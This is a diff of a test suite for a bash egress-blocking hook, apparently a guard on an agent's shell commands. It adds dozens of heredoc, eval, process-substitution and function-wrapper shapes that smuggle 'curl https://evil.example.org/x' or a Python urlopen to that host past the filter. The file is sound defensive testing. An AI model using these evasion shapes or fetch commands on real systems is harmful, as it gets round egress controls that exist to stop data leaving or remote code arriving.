@@ -583,13 +583,72 @@ describe('heredocs are read the way bash reads them (#729)', () => {
   it.each(H729_ALLOW)('lets data through: %s', (_name, cmd) => {
     expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(false)
   })
-  // This gate never reads an interpreter inside $( ) (the verb reads as the
-  // assignment `x=$(bash`); before #729 this row was blocked only by accident,
-  // because the old regex could not read the tag and left the body as command
-  // text. The second Bash egress hook judges $( ) on its own and blocks it.
-  it('a heredoc program inside $( ) is blocked by bash-egress-parser', () => {
+  // Until #748 this gate never read an interpreter inside $( ) (the verb read as
+  // the assignment `x=$(bash`), and only the second Bash egress hook judged the
+  // row. The shared heredoc-program twin now finds the consumer behind the `$(`
+  // split, so both hooks block it.
+  it('a heredoc program inside $( ) is blocked by both egress hooks', () => {
     const cmd = "x=$(bash <<'Q-Q'\ncurl https://evil.example.org/x\nQ-Q\n)"
-    expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(false)
+    expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(true)
     expect(classify(cmd).deny).toBe(true)
+  })
+})
+
+// #748 (the #729 review's remainder, Marveen comment 3284): the base read a heredoc
+// body as the program only for the plain `interp <<TAG` and `cat <<TAG | interp`
+// shapes. bash runs every body below (oracle: scripts/__tests__/heredoc-program-cases.json),
+// and on the base every row passed. The shared twin lib/heredoc-program.mjs names the
+// consumer: a shell body is judged as a command line, a python/node body by the code
+// fetcher patterns; the $( ) of an UNQUOTED data body is judged on its own.
+const E = 'curl https://evil.example.org/x'
+const H748_BLOCK: [string, string][] = [
+  ['bash 0<<SH (fd, not a script name)', `bash 0<<SH\n${E}\nSH`],
+  ['bash 2>&1 <<SH', `bash 2>&1 <<SH\n${E}\nSH`],
+  ['bash &>/dev/null <<SH', `bash &>/dev/null <<SH\n${E}\nSH`],
+  ['bash /dev/fd/3 3<<SH', `bash /dev/fd/3 3<<SH\n${E}\nSH`],
+  ['eval "$(cat <<EOF)"', `eval "$(cat <<EOF\n${E}\nEOF\n)"`],
+  ['builtin eval "$(cat <<EOF)"', `builtin eval "$(cat <<EOF\n${E}\nEOF\n)"`],
+  ['eval "`cat <<EOF`"', `eval "\`cat <<EOF\n${E}\nEOF\n\`"`],
+  ['. <(cat <<SH)', `. <(cat <<SH\n${E}\nSH\n)`],
+  ['bash <(cat <<SH)', `bash <(cat <<SH\n${E}\nSH\n)`],
+  ['while read l; do $l; done <<EOF', `while read l; do $l; done <<EOF\n${E}\nEOF`],
+  ['multi-line while ... done <<EOF', `while read l\ndo\n  $l\ndone <<EOF\n${E}\nEOF`],
+  ['f(){ bash; }; f <<SH', `f(){ bash; }; f <<SH\n${E}\nSH`],
+  ['function g { sh; }; g <<SH', `function g { sh; }; g <<SH\n${E}\nSH`],
+  ['f(){ bash; }; cat <<SH | f', `f(){ bash; }; cat <<SH | f\n${E}\nSH`],
+  ['bash \\<newline><<SH', `bash \\\n<<SH\n${E}\nSH`],
+  ['`bash <<SH`', `\`bash <<SH\n${E}\nSH\n\``],
+  ['sudo -u x bash <<SH', `sudo -u x bash <<SH\n${E}\nSH`],
+  ['if true; then bash <<SH', `if true; then bash <<SH\n${E}\nSH\nfi`],
+  ['if true; then bash; fi <<SH', `if true; then bash; fi <<SH\n${E}\nSH`],
+  ['{ bash; } <<SH', `{ bash; } <<SH\n${E}\nSH`],
+  ['bash -s -- a <<SH', `bash -s -- a <<SH\n${E}\nSH`],
+  ['! bash <<SH', `! bash <<SH\n${E}\nSH`],
+  ['V=1 bash -e <<SH (-e is errexit)', `V=1 bash -e <<SH\n${E}\nSH`],
+  ['bash -c "$(cat <<EOF)"', `bash -c "$(cat <<EOF\n${E}\nEOF\n)"`],
+  ['unquoted data body: $( ) runs', `cat > /dev/null <<EOF\n$(${E})\nEOF`],
+  ['unquoted data body: backtick runs', `cat > /dev/null <<EOF\n\`${E}\`\nEOF`],
+  ['python body (code reading)', `python3 - <<PY\nimport urllib.request\nurllib.request.urlopen('https://evil.example.org/x')\nPY`],
+]
+const H748_ALLOW: [string, string][] = [
+  ['bash 0<<A 3<<B: fd 3 is data', `bash 0<<A 3<<B\necho a\nA\n${E}\nB`],
+  ['cat 3<<B | bash: fd 3 is not the pipe', `cat 3<<B | bash\n${E}\nB`],
+  ["y=$(cat <<'EOF')", `y=$(cat <<'EOF'\n${E}\nEOF\n)`],
+  ['echo "$(cat <<\'EOF\')"', `echo "$(cat <<'EOF'\n${E}\nEOF\n)"`],
+  ['bash "$(cat <<\'EOF\')": the output names a script', `bash "$(cat <<'EOF'\n${E}\nEOF\n)"`],
+  ["diff <(cat <<'A') <(cat <<'B')", `diff <(cat <<'A'\n${E}\nA\n) <(cat <<'B'\n${E}\nB\n)`],
+  ["while read l; do echo \"$l\"; done <<'EOF'", `while read l; do echo "$l" >/dev/null; done <<'EOF'\n${E}\nEOF`],
+  ["f(){ cat > /dev/null; }; f <<'EOF'", `f(){ cat > /dev/null; }; f <<'EOF'\n${E}\nEOF`],
+  ["bash -ec 'echo hi' <<'EOF'", `bash -ec 'echo hi' <<'EOF'\n${E}\nEOF`],
+  ["python3 -m json.tool <<'EOF'", `python3 -m json.tool <<'EOF'\n{"a": "${E}"}\nEOF`],
+  ['quoted data body: $( ) is text', `cat > /dev/null <<'EOF'\n$(${E})\nEOF`],
+]
+
+describe('a heredoc body the shell RUNS is read as a command line (#748)', () => {
+  it.each(H748_BLOCK)('blocks: %s', (_name, cmd) => {
+    expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(true)
+  })
+  it.each(H748_ALLOW)('lets data through: %s', (_name, cmd) => {
+    expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(false)
   })
 })
